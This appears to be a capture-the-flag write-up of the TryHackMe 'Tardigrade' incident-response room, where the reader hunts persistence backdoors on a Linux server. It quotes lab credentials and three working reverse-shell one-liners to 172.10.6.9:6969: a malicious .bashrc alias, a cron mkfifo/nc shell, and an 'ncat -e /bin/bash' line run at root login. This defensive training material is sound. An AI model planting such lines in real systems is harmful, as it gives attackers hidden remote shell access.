---
title: Tardigrade_Room
date: 2023-8-27
categories: [Writeups, THM]
tags: [TAG]     # TAG names should always be lowercase

---
> Can you find all the basic persistence mechanisms in this Linux endpoint? 

![](https://firebasestorage.googleapis.com/v0/b/avatars-2aed4.appspot.com/o/5a8e7a7a02d75283f411004a07e7bfc6(1).png?alt=media&token=596dd21d-4694-49c4-8924-3b035a6aea67)

[room](https://tryhackme.com/room/tardigrade)

A server has been compromised, and the security team has decided to isolate the machine until it's been thoroughly cleaned up. Initial checks by the Incident Response team revealed that there are five different backdoors. It's your job to find and remediate them before giving the signal to bring the server back to production. 

To start our investigation, we need to connect to the server. The IR team has provided the credentials for use below and noted that the user has root privileges to the server. I'll help guide you along at first, but as we progress through each step, I'm sure you'll feel more comfortable solving these on your own.

**user: giorgio**

**password: armani**

---
# Task 1

1. **What is the server's OS version?**

> I searched for the command to get the release for the distro 

```
lsb_release -a 
``` 
![](https://1683260384-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FjSn1mytPOato4sbxsmGQ%2Fuploads%2FJNQucjPeMpa85JTKf2b9%2FScreenshot%20from%202023-08-16%2015-56-49.png?alt=media&token=67e4bf2f-e235-4364-9fac-66fc9c36be6b)

> Ubuntu 20.04.4 LTS

---

# Task 2 

 2. **What's the most interesting file you found in Giorgio's home directory?**
   
 > so we gone list all the files, directories, and the hidden ones 

 ```
 ls -la /home/giorgio 
 ```

 ![](https://1683260384-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FjSn1mytPOato4sbxsmGQ%2Fuploads%2FaxGDJRIYqBCsrz6x0bXx%2FScreenshot%20from%202023-08-16%2015-59-01.png?alt=media&token=1dcb69a8-cf9e-4735-944e-8a10123cdcb3)

 > .bad_bash

 - **Another file that can be found in every user's home directory is the .bashrc file. Can you check if you can find something interesting in Giorgio's .bashrc?**
  
```
nano .bashrc 
```
![](https://1683260384-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FjSn1mytPOato4sbxsmGQ%2Fuploads%2Fy65rLEoPK2hpr0CWefWx%2FScreenshot%20from%202023-08-16%2016-02-40.png?alt=media&token=74d8b014-79aa-44b9-b89e-24e9c3b52b8b)

```
ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'
```
- **It seems we've covered the usual bases in Giorgio's home directory, so it's time to check the scheduled tasks that he owns. Did you find anything interesting about scheduled tasks?**

```
crontab -e 
```
![](https://1683260384-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FjSn1mytPOato4sbxsmGQ%2Fuploads%2FZqxdKx31hNakT5wi3RDi%2FScreenshot%20from%202023-08-16%2016-08-28.png?alt=media&token=f034a915-3d97-4b10-9914-6dff2096b87b)

```
/usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc 172.10.6.9 6969 >/tmp/f
```

---
# Task 4 

> *just sudo su and wait for a minute then press enter*

![](https://1683260384-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FjSn1mytPOato4sbxsmGQ%2Fuploads%2F8hhoCnEthBitKIbk0i2E%2FScreenshot%20from%202023-08-16%2016-12-33.png?alt=media&token=13f94ef5-baf6-4c6f-8061-edcfbaa98473)

- **A few moments after logging on to the root account, you find an error message in your terminal.**

```
Ncat: TIMEOUT.
```
- **After moving forward with the error message, a suspicious command appears in the terminal as part of the error message. What command was displayed?**

```
ncat -e /bin/bash 172.10.6.9 6969
```

- **You might wonder, "How did that happen? I didn't even do anything? I just logged as root, and it happened." Can you find out how the suspicious command has been implemented?**

```
.bashrc 
```
---
# Task 5 

> There's one more persistence mechanism in the system.
> A good way to systematically dissect the system is to look for "usuals" and "unusuals". For example, you can check for commonly abused or unusual files and directories.
> This specific persistence mechanism is directly tied to something (or someone?) already present in fresh Linux installs and may be abused and/or manipulated to fit an adversary's goals. What's its name?
> What is the last persistence mechanism?

> **we can look at the user's path**

```
cat /etc/passwd
```
![](https://1683260384-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FjSn1mytPOato4sbxsmGQ%2Fuploads%2FuI0Chl58gx1I6qDLVbGX%2F2023-08-19_05-28.png?alt=media&token=046f45b2-b91e-408e-93ce-32189c886224)

> **the answer is:  nobody**

---

# Task 6 

> **Finally, as you've already found the final persistence mechanism, there's value in going all the way through to the end.**
> 
> **The adversary left a golden nugget of "advise" somewhere.**
> 
> **What is the nugget?**

- **that task is about finding and persistence mechanisms in the system, lets check / and if there are any files like before**

```
ls -la / 
```
![](https://1683260384-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FjSn1mytPOato4sbxsmGQ%2Fuploads%2FfrHCqauZFA68DE7I0hTK%2FUntitled.png?alt=media&token=c372871e-a14c-45d6-858f-82c0f4696f0c)

> **let's check that directory**

```
cd /nonexistent/
```
![](https://1683260384-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FjSn1mytPOato4sbxsmGQ%2Fuploads%2F5y2N0rd30uOvY2KeEfa4%2FScreenshot%20from%202023-08-16%2016-19-53.png?alt=media&token=6daa83cc-6c23-4377-9ae7-867a60853a0d)

> **and here is the flag :)**